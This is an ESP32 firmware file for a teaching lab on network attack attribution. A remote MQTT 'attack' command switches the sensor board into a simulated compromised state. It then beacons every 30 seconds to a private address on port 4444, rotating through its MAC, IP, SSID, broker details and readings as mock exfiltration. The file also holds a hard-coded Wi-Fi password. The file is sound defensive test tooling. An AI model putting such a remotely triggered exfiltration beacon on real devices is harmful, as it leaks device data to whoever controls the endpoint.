/* =========================================================================
 *  sensor.ino  -  IoT lab node for the attribution project (ESP32 / Arduino)
 * =========================================================================
 *
 *  WHAT THIS BOARD IS FOR
 *  ----------------------
 *  The rest of this project (detection, attribution, the incident brief)
 *  reasons about network traffic. This firmware PRODUCES that traffic on real
 *  hardware, so the pipeline can be demonstrated on a live capture instead of
 *  only on the simulator in sim.py / src/generate.py.
 *
 *  A board has two modes:
 *
 *    NORMAL      It behaves like an ordinary sensor: it joins the lab Wi-Fi,
 *                announces itself once, and then publishes a small JSON
 *                reading over MQTT every 10 seconds. This is the "innocent"
 *                baseline traffic the detector learns as normal.
 *
 *    COMPROMISED We do NOT hard-code this. The board sits in NORMAL until it
 *                receives the word "attack" on its control topic. From then
 *                on, every 30 seconds it also opens a raw TCP connection to a
 *                fixed outside address, sends ~200 bytes, and closes it. That
 *                is a deliberately crude stand-in for a command-and-control
 *                beacon / small exfiltration - the exact behaviour the
 *                attribution step is meant to catch and trace back to origin.
 *
 *  WHAT THE BEACON CARRIES (Step 22)
 *  ---------------------------------
 *  Until Step 22 the beacon was a short header plus "x" padding - the right
 *  SIZE and RHYTHM but meaningless contents. Now it carries what a real piece
 *  of malware on this board could actually read and steal: the board's id,
 *  MAC, IP, gateway, the Wi-Fi network NAME (never the password - the firmware
 *  does not even format WIFI_PASS into anything it sends), signal strength, the
 *  broker it uses, its MQTT client id and topics, uptime, free memory, and its
 *  last few sensor readings. It is JSON, so a human reading the capture (or
 *  src/listener.py) can see exactly what leaked.
 *
 *  That is MORE than fits in one 200-byte packet, so the beacon ROTATES: the
 *  first beacon sends part 1/3, the next 2/3, the next 3/3, then round again.
 *  Each beacon is still ONE connection of ~200 bytes every 30 s - the same
 *  count, size and timing as before - so the detector, which reads only
 *  connection counts, sizes and timing and never the payload, behaves exactly
 *  as it did on the old beacon. Only what a person SEES in the bytes changed.
 *
 *  WHY THE ATTACK IS TRIGGERED, NOT BUILT IN
 *  -----------------------------------------
 *  Flashing the same firmware to every board and switching one into the
 *  compromised state at runtime means the "attack" has a precise start time
 *  that WE choose and record. That start time is the ground truth the
 *  attribution result is later graded against. It also keeps every board
 *  identical, so nothing about a board's binary reveals which one is patient
 *  zero - the pipeline has to work that out from traffic alone.
 *
 *  WHY THE BEACON IS ~200 BYTES EVERY 30s
 *  --------------------------------------
 *  It matches the simulator. In sim.py and src/generate.py the injected C2
 *  traffic is drawn from bytes_out ~ Normal(200, 20). Keeping the real board
 *  in the same ballpark means a capture from this hardware looks like the
 *  synthetic data the models were tuned on - the demo and the numbers agree.
 *
 *  SAFETY / SCOPE
 *  --------------
 *  This is a closed teaching lab. BROKER and TARGET_IP below are private
 *  addresses on an isolated hotspot network (the 192.168.137.x range is the
 *  Windows "Mobile hotspot" / Internet-Connection-Sharing gateway). The
 *  "attack" is a fixed-size heartbeat to one address you own and control; it
 *  carries no payload of interest, scans nothing, and targets nothing outside
 *  the lab. Point TARGET_IP at a machine you run and are allowed to test.
 * ========================================================================= */


/* -------------------------------------------------------------------------
 *  LIBRARIES
 *
 *  WiFi.h        - part of the ESP32 board package (nothing to install
 *                  separately once the ESP32 core is added, see notes at the
 *                  bottom of this file). Gives us the Wi-Fi station and the
 *                  WiFiClient TCP socket.
 *  PubSubClient  - the MQTT client. Install "PubSubClient" by Nick O'Leary
 *                  from the Arduino Library Manager.
 *
 *  The JSON reading is built by hand with snprintf() rather than pulling in a
 *  JSON library. The message is tiny and fixed in shape, so formatting it
 *  ourselves is easier to explain and removes a dependency that could fail to
 *  compile on a fresh machine.
 * ------------------------------------------------------------------------- */
#include <WiFi.h>
#include <PubSubClient.h>


/* =========================================================================
 *  CONFIGURATION  -  the only part you normally edit
 * ========================================================================= */

/* ---- Wi-Fi (the isolated lab network) ---- */
#define WIFI_SSID   "ROOT_4"
#define WIFI_PASS   "panda4146"

/* ---- MQTT broker (runs on the lab laptop / hotspot gateway) ---- */
#define BROKER      "192.168.0.200"
#define BROKER_PORT 1883

/* ---- This board's identity ----
 * CHANGE THIS FOR EACH BOARD before you upload: "esp32-01", "esp32-02", ...
 * It is the only line that differs between the boards, and it is what every
 * topic and every reading is stamped with, so the capture can tell them apart.
 */
#define DEVICE_ID   "esp32-01"

/* ---- Where the beacon goes once the board is compromised ----
 * A single machine on the lab network that you own and are testing against.
 * This is the address the attribution step should end up pointing at.
 */
#define TARGET_IP   "192.168.0.200"
#define TARGET_PORT 4444

/* ---- Timing (milliseconds) ---- */
#define READING_EVERY_MS   10000UL   // normal sensor reading: every 10 s
#define BEACON_EVERY_MS    30000UL   // compromised beacon:    every 30 s
#define BEACON_BYTES       200       // ~200 bytes per beacon, matches the sim

/* ---- Serial console speed (set the Serial Monitor to the SAME number) ---- */
#define SERIAL_BAUD        115200


/* -------------------------------------------------------------------------
 *  DERIVED TOPICS
 *
 *  Adjacent string literals are joined by the compiler, so with
 *  DEVICE_ID = "esp32-01" these become "iot/esp32-01" and "ctrl/esp32-01"
 *  at compile time - no runtime string building, no chance of a mismatch.
 *
 *    PUB_TOPIC   we PUBLISH readings here          -> iot/<DEVICE_ID>
 *    CTRL_TOPIC  we SUBSCRIBE for commands here     -> ctrl/<DEVICE_ID>
 * ------------------------------------------------------------------------- */
#define PUB_TOPIC   "iot/"  DEVICE_ID
#define CTRL_TOPIC  "ctrl/" DEVICE_ID


/* =========================================================================
 *  GLOBAL STATE
 * ========================================================================= */

/* espClient is the underlying TCP socket that PubSubClient (mqtt) speaks
 * MQTT over. It is separate from the socket we open by hand for the beacon,
 * so the two never interfere. */
WiFiClient   espClient;
PubSubClient mqtt(espClient);

/* Latched by the control message. false = behave normally; true = also
 * beacon. Once set it stays set for the rest of the run (until reset/reboot),
 * because a real infection does not politely undo itself. */
bool compromised = false;

/* millis() timestamps of the last reading and the last beacon, so the loop
 * can be non-blocking - we never call delay() in the main loop, we just check
 * whether enough time has passed. */
unsigned long lastReadingMs = 0;
unsigned long lastBeaconMs  = 0;

/* A counter so each reading is distinguishable in the capture / logs. */
unsigned long seq = 0;

/* The last few sensor readings, so a beacon can "steal" something the board
 * really has rather than filler. A tiny ring buffer: newest overwrites oldest.
 * Temperature and humidity are kept as hundredths (ints) to stay short on the
 * wire - 2413 means 24.13 C. */
#define READINGS_KEPT 4
struct Reading { unsigned long seq; int temp_c100; int hum_c100; };
Reading recentReadings[READINGS_KEPT];
int      readingCount = 0;            // how many of the slots are filled (<= READINGS_KEPT)
int      readingHead  = 0;            // where the next reading goes

/* Which part of the rotating payload the next beacon sends: 0, 1, 2, 0, ... */
int beaconPart = 0;


/* =========================================================================
 *  WI-FI
 * ========================================================================= */
void connectWifi() {
  Serial.printf("[wifi] joining \"%s\" ...\n", WIFI_SSID);

  WiFi.mode(WIFI_STA);              // station mode: we are a client, not an AP
  WiFi.begin(WIFI_SSID, WIFI_PASS);

  // Block here until we are on the network. There is nothing useful this
  // board can do without Wi-Fi, so waiting at boot is the right behaviour.
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print('.');
  }

  Serial.printf("\n[wifi] connected, ip=%s\n", WiFi.localIP().toString().c_str());
}


/* =========================================================================
 *  MQTT
 * ========================================================================= */

/* Called by mqtt.loop() whenever a message arrives on a topic we subscribed
 * to. The only topic we subscribe to is CTRL_TOPIC, so this is where the
 * "attack" command flips the board into the compromised state.
 *
 * payload is NOT null-terminated, so we compare using the given length rather
 * than treating it as a C string. */
void onMqttMessage(char* topic, byte* payload, unsigned int length) {
  Serial.printf("[mqtt] message on %s (%u bytes): ", topic, length);
  for (unsigned int i = 0; i < length; i++) Serial.print((char)payload[i]);
  Serial.println();

  // "attack" -> switch on the beacon. (We also accept "stop" to switch it
  // back off, which is handy during a demo but not part of the attack story.)
  if (length == 6 && memcmp(payload, "attack", 6) == 0) {
    compromised = true;
    lastBeaconMs = millis();       // start the 30 s clock from now
    Serial.println("[state] *** COMPROMISED - beaconing enabled ***");
  } else if (length == 4 && memcmp(payload, "stop", 4) == 0) {
    compromised = false;
    Serial.println("[state] beaconing disabled");
  }
}

/* Connect (or reconnect) to the broker and re-subscribe to the control topic.
 * MQTT client ids must be unique on a broker, so we use DEVICE_ID directly. */
void connectMqtt() {
  mqtt.setServer(BROKER, BROKER_PORT);
  mqtt.setCallback(onMqttMessage);

  while (!mqtt.connected()) {
    Serial.printf("[mqtt] connecting to %s:%d as \"%s\" ...\n",
                  BROKER, BROKER_PORT, DEVICE_ID);

    if (mqtt.connect(DEVICE_ID)) {
      Serial.println("[mqtt] connected");
      mqtt.subscribe(CTRL_TOPIC);            // listen for the "attack" command
      Serial.printf("[mqtt] subscribed to %s\n", CTRL_TOPIC);
    } else {
      // rc is the PubSubClient state code; -2 is the usual "can't reach
      // broker". Wait and try again rather than giving up.
      Serial.printf("[mqtt] failed, rc=%d, retrying in 2s\n", mqtt.state());
      delay(2000);
    }
  }
}


/* =========================================================================
 *  NORMAL BEHAVIOUR  -  the innocent sensor
 * ========================================================================= */

/* Announce ourselves once, right after we come online. This is the
 * "publish its own connection at startup" step: it puts one hello record on
 * the wire per boot, so the capture shows exactly when this board joined and
 * with what identity. */
void publishHello() {
  char msg[192];
  snprintf(msg, sizeof(msg),
           "{\"id\":\"%s\",\"event\":\"hello\",\"ip\":\"%s\",\"rssi\":%d}",
           DEVICE_ID, WiFi.localIP().toString().c_str(), WiFi.RSSI());
  mqtt.publish(PUB_TOPIC, msg);
  Serial.printf("[pub] %s <- %s\n", PUB_TOPIC, msg);
}

/* One ordinary sensor reading. There is no real sensor wired up here, so the
 * values are synthesised - a slowly wandering temperature and humidity plus
 * the board's uptime. The SHAPE is what matters to the pipeline, not the
 * physics: a small, regular, self-describing JSON message every 10 seconds. */
void publishReading() {
  // Fake but plausible values. random() on the ESP32 is fine for this.
  float tempC = 24.0 + (random(-200, 200) / 100.0);   // ~22..26 C
  float humid = 50.0 + (random(-500, 500) / 100.0);   // ~45..55 %
  unsigned long thisSeq = seq++;

  // Remember this reading so a later beacon can exfiltrate real recent data.
  // +0.5 before truncating = round to nearest; both values are always positive.
  recentReadings[readingHead] = { thisSeq, (int)(tempC * 100 + 0.5f),
                                          (int)(humid * 100 + 0.5f) };
  readingHead = (readingHead + 1) % READINGS_KEPT;
  if (readingCount < READINGS_KEPT) readingCount++;

  char msg[192];
  snprintf(msg, sizeof(msg),
           "{\"id\":\"%s\",\"seq\":%lu,\"temp\":%.2f,\"hum\":%.2f,\"uptime\":%lu}",
           DEVICE_ID, thisSeq, tempC, humid, millis() / 1000UL);

  mqtt.publish(PUB_TOPIC, msg);
  Serial.printf("[pub] %s <- %s\n", PUB_TOPIC, msg);
}


/* =========================================================================
 *  COMPROMISED BEHAVIOUR  -  the beacon
 * ========================================================================= */

/* Build ONE beacon's JSON into buf, for part number `part` (0, 1 or 2), and
 * pad it with trailing spaces to exactly BEACON_BYTES so every beacon is the
 * same recognisable size on the wire. Returns the number of bytes written.
 *
 * The three parts together are everything a compromised board could hand to a
 * controller WITHOUT touching anything it is not allowed to: it reports its own
 * identity, its own network settings, the NAME of the Wi-Fi it is on (WiFi.SSID
 * is the SSID; WIFI_PASS is never read here or anywhere in this function), the
 * broker and topics it already talks to, and the readings it already took.
 *
 * Splitting the data across successive beacons - instead of making three
 * connections at once - is deliberate: it keeps one connection every 30 s, so
 * the traffic the detector measures is unchanged. */
int buildBeaconPart(char* buf, size_t cap, int part) {
  unsigned long up = millis() / 1000UL;
  int n = 0;

  if (part == 0) {
    // Who and where: identity and network settings.
    n = snprintf(buf, cap,
        "{\"dev\":\"%s\",\"part\":\"1/3\",\"n\":%lu,\"up\":%lu,"
        "\"mac\":\"%s\",\"ip\":\"%s\",\"gw\":\"%s\",\"ssid\":\"%s\",\"rssi\":%d}",
        DEVICE_ID, seq, up,
        WiFi.macAddress().c_str(),
        WiFi.localIP().toString().c_str(),
        WiFi.gatewayIP().toString().c_str(),
        WiFi.SSID().c_str(),           // the network NAME only - never the key
        WiFi.RSSI());
  } else if (part == 1) {
    // What it talks to: the broker, its client id and topics, free memory.
    n = snprintf(buf, cap,
        "{\"dev\":\"%s\",\"part\":\"2/3\",\"n\":%lu,\"up\":%lu,"
        "\"broker\":\"%s:%d\",\"client\":\"%s\",\"sub\":[\"%s\"],"
        "\"pub\":\"%s\",\"heap\":%u}",
        DEVICE_ID, seq, up,
        BROKER, BROKER_PORT, DEVICE_ID, CTRL_TOPIC, PUB_TOPIC,
        (unsigned)ESP.getFreeHeap());
  } else {
    // What it has measured: the last few readings, oldest first.
    n = snprintf(buf, cap,
        "{\"dev\":\"%s\",\"part\":\"3/3\",\"n\":%lu,\"up\":%lu,\"readings\":[",
        DEVICE_ID, seq, up);
    for (int i = 0; i < readingCount; i++) {
      int slot = (readingHead - readingCount + i + READINGS_KEPT) % READINGS_KEPT;
      Reading r = recentReadings[slot];
      n += snprintf(buf + n, cap - n, "%s[%lu,%d,%d]",
                    (i ? "," : ""), r.seq, r.temp_c100, r.hum_c100);
    }
    n += snprintf(buf + n, cap - n, "]}");
  }

  // Pad with spaces up to the fixed size. The trailing spaces sit OUTSIDE the
  // JSON object, so the payload still parses after a strip(); src/listener.py
  // reads it that way.
  while (n < BEACON_BYTES && (size_t)n < cap - 1) buf[n++] = ' ';
  buf[n] = '\0';
  return n;
}

/* Open a raw TCP connection straight to TARGET_IP:TARGET_PORT (bypassing the
 * broker entirely - a compromised device talks to its controller directly),
 * push ~200 bytes, and close. Connect, send, disconnect. Each call sends the
 * NEXT rotating part (1/3 -> 2/3 -> 3/3 -> 1/3 ...), so over three beacons the
 * whole picture leaks, one ~200-byte connection at a time. */
void sendBeacon() {
  WiFiClient beacon;                 // a fresh socket each time, then closed

  Serial.printf("[beacon] connecting to %s:%d ...\n", TARGET_IP, TARGET_PORT);
  if (!beacon.connect(TARGET_IP, TARGET_PORT)) {
    // The target being down must not crash the board - just note it and try
    // again next cycle. The connection ATTEMPT is itself visible in a capture.
    Serial.println("[beacon] connect failed (target down?)");
    return;
  }

  char buf[BEACON_BYTES + 1];
  int n = buildBeaconPart(buf, sizeof(buf), beaconPart);
  beaconPart = (beaconPart + 1) % 3;             // advance for next time

  beacon.write((const uint8_t*)buf, n);
  beacon.stop();                     // close immediately - short-lived by design

  Serial.printf("[beacon] sent %d bytes to %s:%d\n", n, TARGET_IP, TARGET_PORT);
}


/* =========================================================================
 *  SETUP  -  runs once at power-on / reset
 * ========================================================================= */
void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(200);                        // let the serial port settle
  Serial.printf("\n\n[boot] device \"%s\" starting\n", DEVICE_ID);

  connectWifi();
  connectMqtt();
  publishHello();                    // the one-off startup announcement

  // Seed the pseudo-random generator with something that differs per boot so
  // the fake readings are not identical every run.
  randomSeed(micros());

  // Prime the timers so the first reading goes out roughly one interval from
  // now rather than immediately after the hello.
  lastReadingMs = millis();
}


/* =========================================================================
 *  LOOP  -  runs forever
 *
 *  The loop never blocks. Every pass it:
 *    1. keeps the MQTT connection alive (and reconnects if it dropped),
 *    2. sends a reading if 10 s have elapsed,
 *    3. if compromised, sends a beacon if 30 s have elapsed.
 *  Using millis() comparisons instead of delay() means the MQTT client stays
 *  responsive to the "attack" command at all times.
 * ========================================================================= */
void loop() {
  // 1. Wi-Fi / MQTT housekeeping.
  if (WiFi.status() != WL_CONNECTED) connectWifi();
  if (!mqtt.connected())             connectMqtt();
  mqtt.loop();                       // <- lets onMqttMessage() fire

  unsigned long now = millis();

  // 2. Normal reading every 10 s.
  if (now - lastReadingMs >= READING_EVERY_MS) {
    lastReadingMs = now;
    publishReading();
  }

  // 3. Beacon every 30 s, but only once compromised.
  if (compromised && (now - lastBeaconMs >= BEACON_EVERY_MS)) {
    lastBeaconMs = now;
    sendBeacon();
  }
}